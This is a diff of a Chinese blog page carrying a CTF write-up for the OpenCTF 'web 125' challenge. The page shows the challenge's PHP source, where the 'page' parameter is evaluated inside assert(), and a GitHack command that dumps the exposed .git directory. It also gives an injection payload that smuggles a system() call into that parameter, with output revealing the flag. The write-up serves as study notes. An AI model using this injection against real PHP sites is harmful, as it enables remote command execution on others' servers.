@@ -15,7 +15,7 @@
 <meta property="og:url" content="https://icyris.github.io/2017/07/03/OpenCTF/index.html">
 <meta property="og:site_name" content="绿生 | Cyris">
 <meta property="og:description" content="软件嘉年华部分题的题解。（因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记。）">
-<meta property="og:updated_time" content="2017-07-03T11:58:18.051Z">
+<meta property="og:updated_time" content="2017-07-03T12:06:47.595Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="OpenCTF WriteUp">
 <meta name="twitter:description" content="软件嘉年华部分题的题解。（因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记。）">
@@ -209,13 +209,13 @@
       
         <p><a href="http://hdopen.xctf.org.cn/" target="_blank" rel="external">软件嘉年华</a>部分题的题解。（因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记。）</p>
 <a id="more"></a> 
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h2><p>URL: <a href="http://202.112.51.184:8001" target="_blank" rel="external">http://202.112.51.184:8001</a><br>done by 一叶知秋       </p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h2><p>URL: <a href="http://202.112.51.184:8001" target="_blank" rel="external">http://202.112.51.184:8001</a><br>done by 一叶知秋<br>原题题解： <a href="https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md" target="_blank" rel="external">https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md</a>    </p>
 <p>在about页面看到：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">I used:   </div><div class="line">  -<span class="ruby"> Git   </span></div><div class="line">  -<span class="ruby"> PHP   </span></div><div class="line">  -<span class="ruby"> Bootstrap</span></div></pre></td></tr></table></figure></p>
 <p>想到从/.git里拖个源码，这里用的<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a>：   </p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack<span class="selector-class">.py</span> http:<span class="comment">//202.112.51.184:8001/.git/</span></div></pre></td></tr></table></figure>
-<p>flag.php里没什么东西</p>
+<p>flag.php里的：     </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TODO</span></div><div class="line"><span class="comment">// $FLAG = '';</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>index.php里的关键代码：    </p>
+<p>index.php里的关键代码：      </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">	$page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	$page = <span class="string">"home"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</div><div class="line"></div><div class="line"><span class="comment">// I heard '..' is dangerous!</span></div><div class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</div><div class="line"></div><div class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></div><div class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>); </div><div class="line">  </div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require_once</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>这里一叶知秋利用了assert引起的代码注射，构造payload<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?page='.system(<span class="string">"cd /var/www/html/;git diff;"</span>).<span class="symbol">'about</span></div></pre></td></tr></table></figure></p>
 <p>得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">diff --git a/templates/flag.php b/templates/flag.php</div><div class="line">index f8c9436.<span class="number">.1</span>d552ec <span class="number">100644</span></div><div class="line">--- a/templates/flag.php</div><div class="line">+++ b/templates/flag.php</div><div class="line">@@ <span class="number">-1</span>,<span class="number">4</span> +<span class="number">1</span> @@</div><div class="line">-<span class="meta">&lt;?php</span></div><div class="line">-<span class="comment">// TODO</span></div><div class="line">-<span class="comment">// $FLAG = '';</span></div><div class="line">-<span class="meta">?&gt;</span></div><div class="line">+<span class="meta">&lt;?php</span> $FLAG=<span class="string">"xctf&#123;392dba36b0998deac2ed87ceca63c4b2&#125;"</span>; <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
@@ -286,7 +286,7 @@
 		<p style="text-align:justify">	
 		&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
 		最后更新：
-            <time datetime="2017-07-03T11:58:18.051Z" itemprop="dateLastModified">
+            <time datetime="2017-07-03T12:06:47.595Z" itemprop="dateLastModified">
             2017-07-03
             </time>
         </div>
@@ -431,22 +431,6 @@ var _hmt = _hmt || [];
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">NCTF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">OpenCTF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">樱花</a>
               </li>
              
@@ -455,11 +439,15 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">wiki</a>
+                <a href="javascript:void(0)" class="js-tag color3">OpenCTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -475,7 +463,19 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">wiki</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">一些书</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">NCTF</a>
               </li>
             
             <div class="clearfix"></div>
